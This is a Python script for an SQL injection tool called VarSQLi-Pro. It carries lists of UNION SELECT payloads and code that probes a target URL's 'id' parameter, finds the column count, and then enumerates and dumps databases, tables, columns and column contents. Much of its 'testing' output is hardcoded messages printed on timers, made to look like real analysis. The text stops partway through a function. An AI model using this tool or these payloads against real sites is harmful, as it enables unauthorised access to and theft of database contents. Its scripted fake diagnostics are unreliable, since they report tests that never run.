# hi
import requests
import argparse
import re
import datetime
import socket
import time
import colorama
import threading
from colorama import Fore
from colorama import Style
from bs4 import BeautifulSoup

colorama.init()

payloads = [
    ' UNION ALL SELECT 1-- -',
    ' UNION ALL SELECT 1,2-- -',
    ' UNION ALL SELECT 1,2,3-- -',
    ' UNION ALL SELECT 1,2,3,4-- -',
    ' UNION ALL SELECT 1,2,3,4,5-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50-- -',
    ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51-- -',
]

payloads_2 = [
    '%27 UNION ALL SELECT 1-- -',
    '%27 UNION ALL SELECT 1,2-- -',
    '%27 UNION ALL SELECT 1,2,3-- -',
    '%27 UNION ALL SELECT 1,2,3,4-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50-- -',
    '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51-- -',
]

def banner():
    print(Fore.YELLOW + '''
              ___
 _____         H  _____     _ _  {2.1.15 #Stables}
|  |  |___ ___[,]|   __|___| |_| 
|  |  | .'|  _[(]|__   | . | | | {Pham Chien}
 \___/|__,|_| [)]|_____|_  |_|_|
               V         |_|  
                             (ghostmanews.blogspot.com)

    ''')

def payloads_s():
    with open('hello/hello.txt', 'r') as files:
        content = files.read()
        print("")
        print(Fore.YELLOW + Style.BRIGHT + content + Style.RESET_ALL)
        print('''           
[+] Remember, using VarSQLi-Pro or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.

''')
payloads_s()

parser = argparse.ArgumentParser(description="VarSQLi-Pro - Variable SQL Injection Pro - Version : 2.1.18")
parser.add_argument('-u', '--url', dest='url', help='URL Target ( e.g : https://test.com?path_vuln.php?id=1)')
parser.add_argument('--dbs', dest='dbs', action='store_true', help='Enumerate DBMS databases')
parser.add_argument('--tables', dest='TAB', action='store_true', help=' Enumerate DBMS database tables')
parser.add_argument('--columns', dest='COL', action='store_true', help='Enumerate DBMS database table columns')
parser.add_argument('-D', dest='DB', help='DBMS database to enumerate')
parser.add_argument('--dump-all', dest='dumps', action='store_true', help='Dump All DBMS database table columns')
parser.add_argument('-T', dest='TB', help='Enumerate database to enumerate tables ( ex : --dump-all -T < tables name > -C < columns name >)')
parser.add_argument('-C', dest='CO', help='Enumerate database to enumerate columns ( ex : --dump-all -T < tables name > -C < columns name >)')
args = parser.parse_args()

url = args.url

if args.url:
    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing connection to the target URL")
    time.sleep(1)
    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing if the target URL content is stable")
    time.sleep(1.5)
    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " target URL content is stable")
    time.sleep(0.50)
    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing if GET parameter 'id' is dynamic")
    time.sleep(1)
    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')")
    time.sleep(1)
    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks")
    time.sleep(1)
    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing for SQL injection on GET parameter 'id'")
    time.sleep(0.30)
    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'AND boolean-based blind - WHERE or HAVING clause'")
    time.sleep(0.90)
    print(Fore.YELLOW + Style.BRIGHT + "[WARNING]" + Style.RESET_ALL + " reflective value(s) found and filtering out")
    time.sleep(0.100)
    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string='BS')")
    time.sleep(0.20)
    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'Generic inline queries'")
    time.sleep(0.10)
    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'")
    time.sleep(1)
    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'")
    time.sleep(1)
    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'")
    time.sleep(1.5)
    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'")
    time.sleep(1.2)
    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'")
    time.sleep(1)
    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'")
    time.sleep(2)
    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'")
    time.sleep(0.50)
    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'")
    time.sleep(0.50)
    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'")
    time.sleep(0.50)
    print(Fore.YELLOW + Style.BRIGHT + "[WARNING]" + Style.RESET_ALL + " URI parameter '#1*' does not appear to be dynamic")
    time.sleep(0.50)
    print(Fore.YELLOW + Style.BRIGHT + "[WARNING]" + Style.RESET_ALL + " Testing UNION SELECt COUNT NUMBERS NULL or 50 Select....")
    check_vuln = "%27"
    checks = requests.get(url + check_vuln)
    if "at line" in checks.text:
        pass
        pl_check_queries = ' UNION ALL SELECT 1,2,3-- -'
        checks = requests.get(url + pl_check_queries)
        if "The used SELECT" in checks.text:
            pass
            def start_exploit():
                count_num = 0
                for payload in payloads:
                    count_num += 1 
                    check_conn = requests.get(url + payload)
                    if check_conn.status_code == 200:
                        pass
                        exploits = requests.get(url + payload)
                        if "The used SELECT" in exploits.text:
                            pass
                        else:
                            print(f'''
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)  
varsqli identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
  Parameter: id (GET)
      Type: boolean-based blind
      Title: AND boolean-based blind - WHERE or HAVING clause
      Payload: ' AND 6847=6847 AND 'XvUz'='XvUz

      Type: error-based
      Title: MySQL >= AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
      Payload: ' AND (SELECT 4239 FROM(SELECT COUNT(*),CONCAT(0x71787a7871,(SELECT (ELT(4239=4239,1))),0x7170706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Knwb'='Knwb

      Type: time-based blind
      Title: MySQL >= AND time-based blind (query SLEEP)
      Payload: ' AND (SELECT 7342 FROM (SELECT(SLEEP(5)))rKZp) AND 'zqte'='zqte

      Type: UNION query
      Title: Generic UNION query (NULL) - {count_num} columns
      Payload: {payload} CONCAT(0x71787a7871,(SELECT (ELT(4239=4239,1))),0x7170706b71,FLOOR(RAND(0)*2))
---
''')         

                            
                            if args.dbs:
                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting fetching Database name..............")
                                num = count_num
                                nums = [num for num in range(0, num+1)]
                                for numbers in nums:
                                    payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                    split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                    check_count = requests.get(url + split_nums)
                                    if str(numbers) and "::" in check_count.text:
                                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Found columns : {}".format(numbers))
                                        payload_get_dbs = "(SELECT GROUP_CONCAT(database(),'::',version()))"

                                        split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_dbs, payload)
                                        get_content = requests.get(url + split_nums)
                                        html_content = get_content.text
                                        # checking find
                                        check_find = r"\b\w+::\b"
                                        find_all = re.findall(check_find, html_content)
                                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " back-end MySQL : MySQL >= x.x")
                                        print("available databases [2]:")
                                        for dbs in find_all:
                                            dbs_name = dbs.replace("::", " ")
                                            print("+-----------------------+")
                                            print("[*]", dbs_name)
                                            print("[*] information_schema")
                                            print("")
                                            exit()
                                        print("")
                            else:
                                pass

                            if args.DB:
                                if args.dumps:
                                    if args.TB:
                                        if args.CO:
                                            num = count_num
                                            nums = [num for num in range(0, num+1)]
                                            for numbers in nums:
                                                pl1 = "(SELECT GROUP_CONCAT(user(),'::',@@port))"
                                                pl2 = re.sub(r"\b{}\b".format(numbers), pl1, payload)
                                                results = requests.get(url + pl2)
                                                if str(numbers) and "::" in results.text:
                                                    table_names = args.TB
                                                    columns_name = args.CO

                                                    def dump():
                                                        payload1 = f"(SELECT GROUP_CONCAT({columns_name},'::',@@port) FROM {table_names})"
                                                        split_num = re.sub(r"\b{}\b".format(numbers), payload1, payload)
                                                        get_content = requests.get(url + split_num)
                                                        html_content = get_content.text
                                                        find_data = r"\b\w+::\b"
                                                        findall_all = re.findall(find_data, html_content)
                                                        for dump in findall_all:
                                                            dump_dbs = dump.replace("::", "")
                                                            print(f"+-------------------+")
                                                            print(f"| {table_names} - {columns_name}")
                                                            print(f"+-------------------+")
                                                            print(f"| {columns_name} : {dump_dbs}")
                                                            print(f"+-------------------+")
                                                            exit()
                                                    dump()
                                        else:
                                            pass
                                    else:
                                        pass
                                else:
                                    pass
                            else:
                                pass
                            if args.TAB:
                                if args.DB:
                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                    num = count_num
                                    nums = [num for num in range(0, num+1)]
                                    for numbers in nums:
                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                        checking_count = requests.get(url + split_num)
                                        if str(numbers) and "::" in checking_count.text:
                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                            get_content = requests.get(url + split_num)
                                            html_content = get_content.text
                                            find_checking = r"\b\w+::\b"
                                            find_all = re.findall(find_checking, html_content)
                                            print(split_num)
                                            for tables_dump in find_all:
                                                tables_name = tables_dump.replace("::", "")
                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                time.sleep(0.30)
                                            print('+----------------------------------+')
                                            print("|         Tables Name              |")
                                            print("+----------------------------------+")
                                            num_tab = 0
                                            for dump in find_all:
                                                num_tab += 1
                                                tables_name = dump.replace("::", " ")
                                                print("|", tables_name)
                                            print("+----------------------------------+")
                                            print("Find {} Tables".format(num_tab))
                                            print("")
                                            exit()
                                else:
                                    pass
                            else:
                                pass

                            if args.COL:
                                if args.DB: 
                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                    num = count_num
                                    nums = [num for num in range(0, num+1)]
                                    for numbers in nums:
                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                        checking_count = requests.get(url + split_num)
                                        if str(numbers) and "::" in checking_count.text:
                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                            payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                            split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_table, payload)
                                            get_contents = requests.get(url + split_nums)
                                            html_contents = get_contents.text
                                            find_checkings = r"\b\w+::\b\w+::\b"
                                            find_alls = re.findall(find_checkings, html_contents)

                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                            get_content = requests.get(url + split_num)
                                            html_content = get_content.text
                                            find_checking = r"\b\w+::\b\w+::\b"
                                            find_all = re.findall(find_checking, html_content)
                                            print(split_num)
                                            for column_dump in find_all:
                                                columns_name = column_dump.replace("::", " ")
                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching database tables on columns name : {}".format(columns_name))
                                                time.sleep(0.30)
                                            print("+------------------------------+")
                                            print("| Tables Name  |  Columns Name |")
                                            print("+------------------------------+")
                                            num_tab = 0
                                            for dump in find_all:
                                                num_tab += 1
                                                tables_name = dump.replace("::", " ")
                                                print("|", tables_name)
                                            print("+------------------------------+")
                                            print("Find {} Tables and Columns".format(num_tab))
                                            print("")
                                            exit()
                                else:
                                    pass
                            else:
                                pass


                            if args.dumps:
                                if args.DB:
                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                    num = count_num
                                    nums = [num for num in range(0, num+1)]
                                    for numbers in nums:
                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                        checking_count = requests.get(url + split_num)
                                        if str(numbers) and "::" in checking_count.text:
                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                            get_content = requests.get(url + split_num)
                                            html_content = get_content.text
                                            find_checking = r"\b\w+::\b"
                                            find_all = re.findall(find_checking, html_content)
                                            print(split_num)
                                            for tables_dump in find_all:
                                                tables_name = tables_dump.replace("::", "")
                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                time.sleep(0.30)
                                            print('+----------------------------------+')
                                            print("|         Tables Name              |")
                                            print("+----------------------------------+")
                                            num_tab = 0
                                            for dump in find_all:
                                                num_tab += 1
                                                tables_name = dump.replace("::", " ")
                                                print("|", tables_name)

                                            print("+----------------------------+")
                                            print("Find {} Tables".format(num_tab))
                                            break

                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns name.......")
                                    num = count_num
                                    nums = [num for num in range(0, num+1)]
                                    for numbers in nums:
                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                        checking_count = requests.get(url + split_num)
                                        if str(numbers) and "::" in checking_count.text:
                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
